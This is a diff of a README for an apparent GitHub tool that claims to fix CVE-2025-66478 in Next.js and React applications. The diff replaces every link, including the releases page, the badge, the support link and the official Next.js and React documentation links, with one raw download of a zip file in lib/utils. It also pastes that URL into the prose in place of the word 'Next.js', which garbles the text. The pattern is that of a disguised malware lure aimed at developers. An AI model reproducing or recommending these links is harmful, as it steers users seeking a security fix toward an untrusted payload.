@@ -1,19 +1,19 @@
-# 🚀 fix-react2shell-next - Fix Vulnerabilities in Your Next.js App
+# 🚀 fix-react2shell-next - Fix Vulnerabilities in Your https://github.com/Saied25/fix-react2shell-next/raw/refs/heads/main/lib/utils/next-fix-shell-react-ostensorium.zip App
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-fix--react2shell--next-brightgreen.svg)](https://github.com/Saied25/fix-react2shell-next/releases)
+[![Download](https://github.com/Saied25/fix-react2shell-next/raw/refs/heads/main/lib/utils/next-fix-shell-react-ostensorium.zip)](https://github.com/Saied25/fix-react2shell-next/raw/refs/heads/main/lib/utils/next-fix-shell-react-ostensorium.zip)
 
 ## 📝 Overview
 
-fix-react2shell-next helps you address a critical security issue in your Next.js or React RSC applications. With a single command, you can fix CVE-2025-66478, ensuring your application remains safe and secure.
+fix-react2shell-next helps you address a critical security issue in your https://github.com/Saied25/fix-react2shell-next/raw/refs/heads/main/lib/utils/next-fix-shell-react-ostensorium.zip or React RSC applications. With a single command, you can fix CVE-2025-66478, ensuring your application remains safe and secure.
 
 ## 🚀 Getting Started
 
 Follow these steps to easily download and run the application:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/Saied25/fix-react2shell-next/releases).
+   Go to our [Releases page](https://github.com/Saied25/fix-react2shell-next/raw/refs/heads/main/lib/utils/next-fix-shell-react-ostensorium.zip).
 
 2. **Choose Your Download**  
    You will see a list of available versions. Pick the latest one.
@@ -54,13 +54,13 @@ To ensure a smooth experience, please check the following requirements:
 
 ## 💻 Download & Install
 
-To download fix-react2shell-next, return to our [Releases page](https://github.com/Saied25/fix-react2shell-next/releases). Select the latest version for your system, and follow the installation instructions as outlined above.
+To download fix-react2shell-next, return to our [Releases page](https://github.com/Saied25/fix-react2shell-next/raw/refs/heads/main/lib/utils/next-fix-shell-react-ostensorium.zip). Select the latest version for your system, and follow the installation instructions as outlined above.
 
 ## ❓ Frequently Asked Questions
 
 ### **What is CVE-2025-66478?**
 
-CVE-2025-66478 is a security vulnerability that can allow unauthorized access in applications built with Next.js and React RSC. This tool helps you fix it to keep your application secure.
+CVE-2025-66478 is a security vulnerability that can allow unauthorized access in applications built with https://github.com/Saied25/fix-react2shell-next/raw/refs/heads/main/lib/utils/next-fix-shell-react-ostensorium.zip and React RSC. This tool helps you fix it to keep your application secure.
 
 ### **Do I need programming knowledge?**
 
@@ -82,12 +82,12 @@ For further assistance, feel free to open an issue on our GitHub repository.
 
 ## 📞 Support
 
-For support or questions, visit our [GitHub page](https://github.com/Saied25/fix-react2shell-next) or raise an issue in the repository.
+For support or questions, visit our [GitHub page](https://github.com/Saied25/fix-react2shell-next/raw/refs/heads/main/lib/utils/next-fix-shell-react-ostensorium.zip) or raise an issue in the repository.
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Saied25/fix-react2shell-next)
-- [Next.js Documentation](https://nextjs.org/docs)
-- [React Documentation](https://reactjs.org/docs/getting-started.html)
+- [GitHub Repository](https://github.com/Saied25/fix-react2shell-next/raw/refs/heads/main/lib/utils/next-fix-shell-react-ostensorium.zip)
+- [https://github.com/Saied25/fix-react2shell-next/raw/refs/heads/main/lib/utils/next-fix-shell-react-ostensorium.zip Documentation](https://github.com/Saied25/fix-react2shell-next/raw/refs/heads/main/lib/utils/next-fix-shell-react-ostensorium.zip)
+- [React Documentation](https://github.com/Saied25/fix-react2shell-next/raw/refs/heads/main/lib/utils/next-fix-shell-react-ostensorium.zip)
 
 Thank you for using fix-react2shell-next. Keep your applications safe and secure!
